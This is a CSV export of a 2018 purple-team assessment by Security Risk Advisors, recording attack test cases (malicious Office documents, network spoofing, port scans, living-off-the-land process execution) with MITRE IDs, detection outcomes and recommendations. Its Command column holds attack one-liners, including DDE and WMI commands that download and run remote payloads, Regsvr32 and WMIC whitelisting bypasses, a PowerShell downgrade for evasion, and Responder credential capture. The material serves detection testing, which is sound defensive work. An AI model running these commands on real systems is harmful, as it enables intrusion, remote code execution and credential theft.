AssessmentGroup,Campaign,Phase,Variant,MitreID,CapecId,Method,Status,Outcome,Alert Severity,Alert Triggered,Activity Logged,Outcome Notes,Detection Recommendations,SourceIps,TargetAssets,ExpectedDetectionLayers,DetectingTools,Start Time,Start Time Epoch,Stop Time,Stop Time Epoch,Detection Time,Detection Time Epoch,Organizations,Tags,Objective,Command,References,Liklihood,Risk,Internal/External,Stealth,Attack Vector,Attack Complexity,Privileges Required,Attacker Tools
Enterprise Purple – 2018 Q1,Malicious Document Execution,Execution,4 - Macro - WScript EXE,T1203,,Client-side Execution,Completed,Detected,High,TBD,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",DoDonpachi,2018-01-11T13:26:07.130Z,1515677167130,2018-01-11T14:32:06.130Z,1515681126130,2019-01-28T17:01:45.035Z,1548694905035,Security Risk Advisors,,Execute malicious Office document on the endpoint,Copy macro template into office document,,Low,Low,Internal,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q1,Malicious Document Execution,Execution,2 - Macro - CobaltStrike Standard (MMG),T1203,,Client-side Execution,Completed,Detected,High,TBD,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",DoDonpachi,2018-01-11T11:20:41.130Z,1515669641130,2018-01-11T12:04:44.130Z,1515672284130,2019-01-28T17:01:25.276Z,1548694885276,Security Risk Advisors,,Execute malicious Office document on the endpoint,python MMG.py [config] [output],,Low,Low,Internal,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,Malicious Document Execution,Execution,11 - DDE - Exe,T1203,,Client-side Execution,Completed,Detected,High,TBD,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",DoDonpachi,2018-01-11T05:17:24.130Z,1515647844130,2018-01-11T05:36:00.130Z,1515648960130,2019-01-28T17:02:44.400Z,1548694964400,Security Risk Advisors,,Execute malicious Office document on the endpoint,=cmd|'/c certutil https://<exe url> <local file location> && <local file location> && del <local file location>'!A1,,Low,Low,Internal,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2018 Q1,Malicious Document Execution,Execution,12 - Macro - Remote Template,T1203,,Client-side Execution,Completed,Detected,High,TBD,TBD,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",DoDonpachi,2018-01-11T08:00:02.130Z,1515657602130,2018-01-11T09:07:36.130Z,1515661656130,2018-01-11T10:49:53.130Z,1515667793130,Security Risk Advisors,,Execute malicious Office document on the endpoint,"Create a Word document, add the macro, then save as a .dotm 

Host the template

Create a new document and link the hosted template to it 
(Developer -> Document Template -> Document Template Url)",,Low,Low,Internal,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2018 Q1,Malicious Document Execution,Execution,1 - Macro - Cobalt Strike Standard,T1203,,Client-side Execution,Completed,Detected,High,No,TBD,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines","DoDonpachi,Donpachi",2018-01-10T14:35:49.130Z,1515594949130,2018-01-10T15:37:19.130Z,1515598639130,2019-01-28T17:02:59.432Z,1548694979432,Security Risk Advisors,,Execute malicious Office document on the endpoint,"Generate MS Office Macro from cobalt Strike (Attacks -> Packages -> MS Office Macro)

Put macro in office document

Execute the office document on endpoint",,Low,Low,Internal,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,Malicious Document Execution,Execution,10 - DDE - PowerShell,T1203,,Client-side Execution,Completed,Detected,High,TBD,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines","DoDonpachi,Progear",2018-01-11T02:25:00.130Z,1515637500130,2018-01-11T03:35:19.130Z,1515641719130,2019-01-28T16:38:35.827Z,1548693515827,Security Risk Advisors,,Execute malicious Office document on the endpoint,"=cmd|'/c powershell -Exec ByPass -nop -noexit -c IEX ((New-Object Net.WebClient).DownloadString(\""http://<location of payload>\""))'!A1",,Low,Low,Internal,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2018 Q1,Malicious Document Execution,Execution,6 - Macro - MMG WMI PowerShell,T1203,,Client-side Execution,Completed,Blocked,TBD,No,TBD,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",Donpachi,2018-01-11T16:07:54.130Z,1515686874130,2018-01-11T16:29:10.130Z,1515688150130,2018-01-11T18:12:03.130Z,1515694323130,Security Risk Advisors,,Execute malicious Office document on the endpoint,python MMG.py [config] [output],,Low,Low,Internal,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,Malicious Document Execution,Execution,5 - Macro - WScript PowerShell XOR,T1203,,Client-side Execution,Completed,Blocked,TBD,No,TBD,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",Donpachi,2018-01-10T20:41:05.130Z,1515616865130,2018-01-10T20:45:00.130Z,1515617100130,2018-01-10T21:21:22.130Z,1515619282130,Security Risk Advisors,,Execute malicious Office document on the endpoint,Copy macro template into office document,,Low,Low,Internal,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,Network MiTM,Exploitation,Unencrypted Windows Update,T1040,,Network spoofing,Completed,Blocked,TBD,No,TBD,,,,,Secure Baselines,Secure Configs,2018-01-17T01:43:06.130Z,1516153386130,2018-01-17T02:58:19.130Z,1516157899130,2018-01-17T04:05:07.130Z,1516161907130,Security Risk Advisors,,Intercept Windows Updates on the target laptop in order to run a malicious binary,./wsuxploit.sh <TARGET_IP> <WSUS_IP> <WSUS_PORT> <BINARY_PATH>,,High,High,Internal,Medium,,,,
Enterprise Purple – 2018 Q1,Network MiTM,Exploitation,LLMNR,T1557.001,,Network spoofing,Completed,NotDetected,TBD,TBD,No,,1) Rogue device triggers alert from NAC solution or potential UEBA tool when broadcasting lots of traffic.,,,"Network Isolation,Secure Baselines,Behavior Analytics",,2018-01-17T05:09:47.130Z,1516165787130,2018-01-17T06:24:51.130Z,1516170291130,2018-01-17T08:07:02.130Z,1516176422130,Security Risk Advisors,,"Respond to local network queries for systems over LLMNR and NetBIOS, obtain domain user password hashes and clear text credentials.",,,High,High,Internal,Medium,,,,Responder
Enterprise Purple – 2018 Q1,Network MiTM,Exploitation,Basic Auth & WPAD,T1040,,Network spoofing,Completed,Blocked,TBD,No,TBD,,1) Rogue device triggers alert from NAC solution or potential UEBA tool when broadcasting lots of traffic.,,,"Network Isolation,Secure Baselines,Behavior Analytics",Secure Configs,2018-01-17T13:26:01.130Z,1516195561130,2018-01-17T13:43:41.130Z,1516196621130,2018-01-17T14:06:59.130Z,1516198019130,Security Risk Advisors,,"Respond to local network queries for systems over LLMNR and NetBIOS, obtain domain user password hashes and clear text credentials",,,High,High,Internal,Medium,,,,Responder
Enterprise Purple – 2018 Q1,Network MiTM,Exploitation,Inveigh,T1557.001,,Network Spoofing,Completed,NotDetected,TBD,TBD,No,,1) Rogue device triggers alert from NAC solution or potential UEBA tool when broadcasting lots of traffic.,,,"Network Isolation,Secure Baselines,Behavior Analytics",,2018-01-17T09:30:44.130Z,1516181444130,2018-01-17T11:23:15.130Z,1516188195130,2018-01-17T11:56:01.130Z,1516190161130,Security Risk Advisors,,Run the powershell inveigh toolset via a beacon.,Invoke-Inveigh  NBNS - Y,,Low,Low,Internal,Low,,,,
Enterprise Purple – 2018 Q1,External Port Scans,Reconnaissance,"External - Moderate Port Scan with 10 ports, service enumeration, and NSE's",T1046,,Port scanning,Completed,Detected,Info,TBD,TBD,,"1) Port scanning is detected by external IDS/IPS or firewall, with alert triggered in SIEM or other alerting mechanism",,,"Firewall,SIEM",MUSHA,2018-01-03T06:14:15.130Z,1514960055130,2018-01-03T06:15:29.130Z,1514960129130,2019-01-28T17:50:09.606Z,1548697809606,Security Risk Advisors,,Identify open ports and services,"nmap --open -v 2 -sS -Pn -p 21,80,443,8080,8443 --script=ftp-anon.nse,ftp-proftpd-backdoor.nse,ftp-vsftpd-backdoor.nse,ftp-vuln-cve2010-4221.nse,http-admin-check.nse,http-title.nse --script-args=http.useragent=""Mozilla/5.0; Windows NT 6.1; WOW64; Trident/7.0; rv:11.0; like Gecko"" -oA scans/nmap_moderate -iL targets.txt",,High,Low,External,Low,,,,Nmap
Enterprise Purple – 2018 Q1,External Port Scans,Reconnaissance,"External - Stealthy Port Scan with 3 ports, service enumeration, limited NSE's",T1046,,Port scanning,Completed,Detected,Info,TBD,TBD,,"1) Port scanning is detected by external IDS/IPS or firewall, with alert triggered in SIEM or other alerting mechanism",,,"Firewall,SIEM",MUSHA,2018-01-03T08:41:27.130Z,1514968887130,2018-01-03T10:00:45.130Z,1514973645130,2019-01-28T17:51:00.950Z,1548697860950,Security Risk Advisors,,Identify open ports and services,"nmap --open -v 2 -sS -Pn -p 80,443,8080 --data-length 471 --randomize-hosts --script=http-title.nse --script-args=http.useragent=""Mozilla/5.0;Windows NT 6.1; WOW64; Trident/7.0; rv:11.0; like Gecko"" -oA scans/nmap_stealthy -iL targets.txt",,High,Low,External,Low,,,,Nmap
Enterprise Purple – 2018 Q1,External Port Scans,Reconnaissance,"External - Noisy Port Scan with 1000 ports, service enumeration, and NSE's",T1046,,Port scanning,Completed,Detected,Info,TBD,TBD,,"1) Port scanning is detected by external IDS/IPS or firewall, with alert triggered in SIEM or other alerting mechanism",,,"Firewall,SIEM",MUSHA,2018-01-03T12:57:45.130Z,1514984265130,2018-01-03T13:06:22.130Z,1514984782130,2019-01-28T17:51:18.931Z,1548697878931,Security Risk Advisors,,Identify open ports and services,nmap --open -v2 -sS -Pn -oA nmap_noisy -iL ranges.txt,,High,Low,External,Low,,,,Nmap
Enterprise Purple – 2018 Q1,Suspicious Process Execution,Exploitation,Process Creation Using MSBuild,,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection",,2018-01-13T21:38:05.130Z,1515879485130,2018-01-13T22:37:57.130Z,1515883077130,2018-01-13T23:39:44.130Z,1515886784130,Security Risk Advisors,,Spawn a new process using MSBuild.,msbuild.exe <path to xml file>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2018 Q1,Suspicious Process Execution,Exploitation,Process Creation Using HTA,T1218.005,,Trusted Windows Binary,Completed,Blocked,TBD,No,TBD,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection",Donpachi,2018-01-13T05:34:07.130Z,1515821647130,2018-01-13T07:22:43.130Z,1515828163130,2018-01-13T08:52:07.130Z,1515833527130,Security Risk Advisors,,Spawn a new process using HTA.,mshta <full path to hta>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2018 Q1,Suspicious Process Execution,Exploitation,Process Creation Using Regsvr32,T1218.010,,Trusted Windows Binary,Completed,Detected,High,No,TBD,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection","DoDonpachi,Donpachi",2018-01-13T01:57:16.130Z,1515808636130,2018-01-13T03:28:08.130Z,1515814088130,2019-01-28T17:10:58.041Z,1548695458041,Security Risk Advisors,,Spawn a new process to bypass application whitelisting controls with Regsvr32 (Squiblydoo).,regsvr32 /s /n /u /i:<path to scriptlet> scrobj.dll,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2018 Q1,Suspicious Process Execution,Exploitation,Process Creation Using VBS,T1059.004,,Trusted Windows Binary,Completed,Detected,Med,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection",DoDonpachi,2018-01-13T17:56:46.130Z,1515866206130,2018-01-13T19:27:46.130Z,1515871666130,2019-01-29T06:16:34.342Z,1548742594342,Security Risk Advisors,,Spawn a new process using VBS.,cscript <path to vbs file>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2018 Q1,Suspicious Process Execution,Exploitation,Process Creation Using JS,T1059.004,,Trusted Windows Binary,Completed,Detected,High,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection",DoDonpachi,2018-01-13T15:27:08.130Z,1515857228130,2018-01-13T16:51:08.130Z,1515862268130,2019-01-29T10:53:48.954Z,1548759228954,Security Risk Advisors,,Spawn a new process using JS.,cscript <path to js file>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2018 Q1,Suspicious Process Execution,Exploitation,Obfuscated Commands - CMD,T1059.004,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,,,,"EDR,Endpoint Protection",,2018-01-14T04:16:03.130Z,1515903363130,2018-01-14T05:25:26.130Z,1515907526130,2018-01-14T05:59:17.130Z,1515909557130,Security Risk Advisors,,Run an obfuscated CMD command to run a malicious command.,invoke-dosfuscation -> run command,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2018 Q1,Suspicious Process Execution,Exploitation,Process Creation Using PowerShell,T1059.001,,Trusted Windows Binary,Completed,Detected,Med,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection","DoDonpachi,Progear",2018-01-13T09:17:03.130Z,1515835023130,2018-01-13T10:39:31.130Z,1515839971130,2019-01-28T16:39:15.891Z,1548693555891,Security Risk Advisors,,Spawn a new process using PowerShell.,powershell.exe <run command>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2018 Q1,Suspicious Process Execution,Exploitation,PowerShell Downgrade,T1059.001,,Trusted Windows Binary,Completed,Detected,Med,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection","DoDonpachi,Progear",2018-01-14T06:55:03.130Z,1515912903130,2018-01-14T08:45:26.130Z,1515919526130,2019-01-28T16:39:29.266Z,1548693569266,Security Risk Advisors,,Execute PowerShell in a degraded version to avoid security controls in newer versions.,powershell.exe -v 2,,Low,Low,Internal,Low,,,,PowerShell
Enterprise Purple – 2018 Q1,Suspicious Process Execution,Exploitation,Process Creation Using WMI Format Table,T1047,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection",,2018-01-14T10:07:09.130Z,1515924429130,2018-01-14T12:03:10.130Z,1515931390130,2018-01-14T12:37:10.130Z,1515933430130,Security Risk Advisors,,Spawn a new process to bypass application whitelisting controls with WMI Format Table (Squiblytoo).,wmic os get /format:<url to xsl file>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2018 Q1,Suspicious Process Execution,Exploitation,Process Creation Using WMI,T1047,,Trusted Windows Binary,Completed,Detected,Med,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection","DoDonpachi,Progear",2018-01-13T12:24:21.130Z,1515846261130,2018-01-13T14:04:04.130Z,1515852244130,2019-01-28T17:09:40.089Z,1548695380089,Security Risk Advisors,,Spawn a new process using WMI.,"wmic process call create ""powershell -nop -c 'IEX ((new-object net.webclient).downloadstring(https://somedomain/1234))'""",,Low,Low,Internal,Low,,,,Native Windows Commands
